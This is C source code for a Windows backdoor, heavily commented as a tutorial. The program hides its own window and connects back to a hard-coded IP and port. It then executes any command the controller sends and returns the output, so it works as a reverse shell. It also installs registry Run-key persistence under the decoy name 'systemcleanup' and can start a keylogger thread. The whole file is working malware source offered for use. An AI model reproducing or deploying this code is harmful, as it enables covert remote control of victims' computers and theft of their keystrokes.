#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"

#define bzero(p, size) (void) memset((p), 0, (size)) //Allocating zeros to all our arrays, this is like memset but can be used on Linux. This is a preprocessor function (p being the buffer)

int sock; //Needed in many functions, this is a global variable

//THIS IS A FUNCTION CUSTOM MADE THAT ALLOWS US TO BOOT UP THE PROGRAM ADDING AN ELEMENT OF PERSISTANCE (Line 78), This is one of the most complex function that we have here
int bootRun(){ //Will take no inputs, will return an int as a result (0 if all is good or -1 if there is an error)
       char err[128] = "Failed\n"; //Error variable used if there are any issues in the bootRun function
       char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"; //Success variable that tells us that the persistance worked and also tells us the persistance directory
       
       TCHAR szpath[MAX_PATH]; //This is a windows character string used for Unicode strings (MAX_PATH being 256 Characters on Windows 10)
       DWORD pathLen = 0; //DWORD is short for "Double Word" which is a data type that is an unsigned 32 bit unit of data and it can contain an intiger value

       pathLen = GetModuleFileName(NULL, szpath, MAX_PATH); //This function will take the fully specified path of the file that contains the specified module, in our case the malware
       if(pathLen == 0){ //Error checking to see if all is good with the path, if its zero it is an error
             send(sock, err, sizeof(err), 0); //Sending to socket object, this will send the error to it
             return -1; //Return an error
       }

       HKEY NewVal; //Creating our variable to store on target computer
       if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS){ //This function does the following: Opens up the specified registry (we gave it the path) and it will try to add the new value to it
             //Send error if it doesnt work:
             send(sock, err, sizeof(err), 0); //Sending to socket object, this will send the error to it
             return -1; //Return an error
       }        
       
       DWORD pathLenInBytes = pathLen * sizeof(*szpath); //This will gives us the bytes of our path length

       if (RegSetValueEx(NewVal, TEXT("systemcleanup"), 0, REG_SZ, (LPBYTE)szpath, pathLenInBytes) != ERROR_SUCCESS){ //This will create the key in our directory, the name we create and also we give it a type which most of them use REG_SZ
            //Send error if it doesnt work:
            RegCloseKey(NewVal); //Close the key that we created
            send(sock, err, sizeof(err), 0); //Sending to socket object, this will send the error to it
            return -1; //Return an error
       }
       //If all above worked then continue with the following code:
       RegCloseKey(NewVal);
       send(sock, suc, sizeof(suc), 0); //Sending to socket object, this will send the error to it
       return 0; //Return an error
}//End of our custom function

//THIS IS A FUNCTION CUSTOM MADE THAT ALLOWS US TO ELIMINATE THE "CD " PART OF OUR DIRECTORY, WILL BE USED LATER (Line 73)
char *
str_cut(char str[], int slice_from, int slice_to)
{
        if (str[0] == '\0')
                return NULL;

        char *buffer;
        size_t str_len, buffer_len;

        if (slice_to < 0 && slice_from > slice_to) {
                str_len = strlen(str);
                if (abs(slice_to) > str_len - 1)
                        return NULL;

                if (abs(slice_from) > str_len)
                        slice_from = (-1) * str_len;

                buffer_len = slice_to - slice_from;
                str += (str_len + slice_from);

        } else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str);

                if (slice_from > str_len - 1)
                        return NULL;
                buffer_len = slice_to - slice_from;
                str += slice_from;

        } else
                return NULL;

        buffer = calloc(buffer_len, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;
} //End of our custom function

void Shell(){ //We will be using this function below for our server
    char buffer[1024]; //Using this to store the command, this command will be stored here and it will be sent to the target
    char container[1024];
    char total_response[18384];

    while(1){ //Infinite loop
       jump: //Jumping to a point after execution, here the user can enter another command
       bzero(buffer,1024); //Will allocate buffer array to be all zeros
       bzero(container,sizeof(container));
       bzero(total_response, sizeof(total_response));
       recv(sock, buffer, 1024, 0); //This will handle server connections

       if (strncmp("q", buffer, 1) == 0){ //If q is inserted the server will terminate the connected from the host PC
            closesocket(sock); //Close any connections
            WSACleanup(); //Used for windows operating systems
            exit(0); //Exit program and close all background processes
       }
       else if (strncmp("cd ", buffer , 3) == 0){ //This is going to be used so we will be able to change directories in our victims computer by using "cd" in the terminal, we compare "cd" with our buffer and we check for 2 charecters PLUS the space. Since cd and cd _ is a very different command! (cd on its own prints current directory and cd _ changes the directory)
            //These commands will handle changing in directory
            chdir(str_cut(buffer, 3, 100)); //!CUSTOM FUNCTION USED HERE! -> This function allows us to change the current directory of a program, it can navigate through directories within a file system. Gets command from buffer, starts copying test from line 3 (skips the cd _) till the max of 100 characters
       }
       else if(strncmp("persist", buffer, 7) == 0){
            bootRun(); //Run the program, add persistence
       }
       else if(strncmp("keylog_start", buffer, 12) == 0){ //This is responsible for activating the keylogger program, we will be using a thread (a small program running in the background, this will make us be able to use other instructions)
            HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL); //We use NULL and 0 since we wont want to define anything else, we only define "logg" which is our keylogger function name
            goto jump; //After the thread has been created jump to a point in program, this is the part where we can initiate another command
       }
       else{
            FILE *fp; //Telling the server what to run
            fp = _popen(buffer, "r"); //Opening an executable as a process, reads from buffer and execute it (response gets stored)

            while(fgets(container,1024,fp) != NULL ){ //Sending response back to server, we are checking if the response can fit in 1024 bytes, if its larger continue below
                strcat(total_response, container); //We are adding the first 1024 bytes to a container buffer then it is moved into the total response, this is basically cutting text and pasting it concatenanting it slowly until we have the entire message pasted in the buffer slowly
            }   
            send(sock,total_response, sizeof(total_response), 0); //The send function will handle the sending the total response to the server, 0 indicates means we dont want to specify anything besides that
            fclose(fp); //Close all instances of the file
       }


    }
} 

//The HINSTANCE is an instance that represents a handle to a module, the OS uses this module to identify the executable when it is loaded into memory (also used for some windows functions)
//The hPrev has no real meaning, it was used in 16 bit windows, now the value is always 0
//The LpCmdLine contains the command line arguments for the CLI, such as a unicode string
//The nCmdShow is a flag that specifies if the main application window is maximised, minimsed or shown normally
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
    //Minimizing the program so it is invisable to the user, the program wont be seen
    HWND stealth; //Creating a handle to a window
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL); //Defining stealth

    ShowWindow(stealth,0); //Making sure the window is invisable, our paramater is 0 so it means it remains hidden

    struct sockaddr_in ServAddr; //We are definint a structure that will hold our server connection details
    unsigned short int ServPort; //The port we are going to connect to for our backdoor
    char *ServIP; //Pointer pointing to a memory address, it will point to our server IP variable
    WSADATA wsaData; //It is a structure that contains information about windows sockets, it will help when connecting to a windoes machine

    ServIP = "192.168.68.107"; //ENTER THE IP OF THE MACHINE YOU ARE USING -> This is our linux virtual machine
    ServPort = 50005; //AN UNUSED PORT THAT YOUR MACHINE ISINT USING SO THE PROGRAM CAN RUN ON

    if (WSAStartup(MAKEWORD(2,0),&wsaData) != 0){ //This if statement checks wheather the result of this function is equal to zero or not, if it is equal to zero it will continue, if not it will exit
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM,0); //The first paramater shows that we are establishing a connection under IPv4, the second shows we will be using TCP and the third means we arent defining anything else

    memset(&ServAddr,0,sizeof(ServAddr)); //Memory set is a function that will replace all numbers returned by the server , say "18329483" to be all zeros, the first paramater is the memory location of the variable we want to use, zero being what we want to replace it with and the othe being the size 
    ServAddr.sin_family = AF_INET; //First paramater will be accessed by this
    ServAddr.sin_addr.s_addr = inet_addr(ServIP); //This will store and convert our previously mentioned IP address into an IP address format (since you cannot use a string to do connections)
    ServAddr.sin_port = htons(ServPort); //Will convert the intiger of the port to a port format -> IF THERE IS AN EROR REPLACE THE "." WITH "/"

    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr) != 0)){ //While loop to retry connection to server IF IT DOESNT WORK
        Sleep(10); //Wait for 10 seconds if connection failed
    }

    //THIS IS AN OPTIONAL ADDITION, WE WILL BE DISPLAYING A MESSAGE TO OUR TARGET FOR PENETRATION TESTING REASONS, REMOVE FOR ANONIMITY!!!
    MessageBox(NULL, TEXT("! MALWARE CODE INJECTED SUCCESSFULLY !"), TEXT("CRITICAL NOTIFICATION"), MB_OK | MB_ICONERROR); //Send message to target, the first TEXT is the actual message and the other TEXT is the header of the window. The MB_OK represents an "Ok" button in the window, the "MB_ICONERROR" is an error icon for the window
    //END OF MESSAGE

    Shell(); //This will recieve commands from our server, this can execute functions and output results, this is our "Command and Control (C&C)" server
}
